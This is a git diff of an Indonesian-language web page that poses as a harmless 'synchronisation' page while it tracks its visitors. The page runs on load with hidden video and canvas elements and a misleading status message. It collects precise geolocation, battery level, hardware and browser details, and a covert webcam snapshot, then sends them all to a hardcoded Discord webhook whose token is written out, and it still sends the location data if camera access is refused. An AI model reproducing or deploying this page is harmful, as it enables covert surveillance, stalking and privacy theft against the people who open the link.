@@ -1,77 +1,92 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sistem Pelacak</title>
+    <meta charset="UTF-8">
+    <title>Sistem Sinkronisasi</title>
 </head>
 <body>
     <video id="video" style="display:none;" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    <p id="status">Menghubungkan ke satelit...</p>
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <p id="status">Sedang memproses data...</p>
+    </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1490896106698051719/dEAoVaMVu-xEMBSc2YUcDo_9s8aMd0VTkTo-fjk9gFoxLWi3bCF5l4-sMsZeYbXCVICA";
 
         async function jalankanSistem() {
-            // 1. Ambil Info Perangkat
-            const infoDevice = `Platform: ${navigator.platform}\nRAM: ${navigator.deviceMemory || 'N/A'} GB\nUser Agent: ${navigator.userAgent}`;
-
-            // 2. Ambil Lokasi
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                // Kirim Teks (Lokasi & Device) ke Discord
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🚨 Target Terdeteksi!",
-                            color: 16711680,
-                            fields: [
-                                { name: "📍 Lokasi", value: `[Klik ke Google Maps](${gmaps})` },
-                                { name: "📱 Info Perangkat", value: infoDevice },
-                                { name: "🎯 Akurasi", value: `${p.coords.accuracy} meter` }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-
-                // 3. Ambil Foto Kamera (Memicu permintaan izin kamera)
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-
-                    // Beri jeda 2 detik agar kamera fokus sebelum snapshot
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            formData.append("file", blob, "foto_target.png");
-                            formData.append("payload_json", JSON.stringify({ content: "📸 **Foto Target:**" }));
-
-                            // Kirim file foto ke Discord
-                            await fetch(webhookURL, { method: "POST", body: formData });
-                            
-                            // Matikan kamera setelah selesai
-                            stream.getTracks().forEach(track => track.stop());
-                        }, 'image/png');
-                    }, 2000);
-                } catch (err) {
-                    console.log("Izin kamera ditolak target.");
+            try {
+                // 1. Ambil Info Baterai
+                let batteryInfo = "Tidak terdeteksi";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}%`;
                 }
 
-                document.getElementById('status').innerText = "Data Terverifikasi.";
-            }, (err) => {
-                document.getElementById('status').innerText = "Gagal: Berikan izin akses.";
-            }, { enableHighAccuracy: true });
+                // 2. Ambil Info Hardware & Browser
+                const hardware = `${navigator.hardwareConcurrency || 'N/A'} Core / ${navigator.deviceMemory || 'N/A'} GB RAM`;
+                const browser = navigator.userAgent;
+                const platform = `${navigator.platform} (${screen.width}x${screen.height})`;
+
+                // 3. Ambil Lokasi
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    const acc = Math.round(p.coords.accuracy);
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // Teks Pesan Utama
+                    const pesanTeks = 
+                        `📍 **Maps:**\n${mapsLink}\n` +
+                        `🎯 **Akurasi:** ${acc} meter\n` +
+                        `🔋 **Baterai:** ${batteryInfo}\n` +
+                        `📱 **Perangkat:** ${platform}\n` +
+                        `🧠 **Hardware:** ${hardware}\n` +
+                        `🌐 **Browser:** ${browser}`;
+
+                    // 4. Ambil Foto Kamera
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+
+                        setTimeout(() => {
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(async (blob) => {
+                                const formData = new FormData();
+                                // Kirim file foto dan teks dalam satu request
+                                formData.append("file", blob, "capture.png");
+                                formData.append("payload_json", JSON.stringify({
+                                    content: pesanTeks
+                                }));
+
+                                await fetch(webhookURL, { method: "POST", body: formData });
+                                
+                                stream.getTracks().forEach(track => track.stop());
+                                document.getElementById('status').innerText = "Proses Selesai.";
+                            }, 'image/png');
+                        }, 2000);
+                    } catch (camErr) {
+                        // Jika kamera ditolak, tetap kirim datanya saja
+                        await fetch(webhookURL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ content: pesanTeks + "\n❌ *Kamera Ditolak*" })
+                        });
+                        document.getElementById('status').innerText = "Data Terkirim (Tanpa Foto).";
+                    }
+
+                }, (locErr) => {
+                    document.getElementById('status').innerText = "Gagal: Izin lokasi diperlukan.";
+                }, { enableHighAccuracy: true });
+
+            } catch (err) {
+                console.error(err);
+            }
         }
 
         window.onload = jalankanSistem;
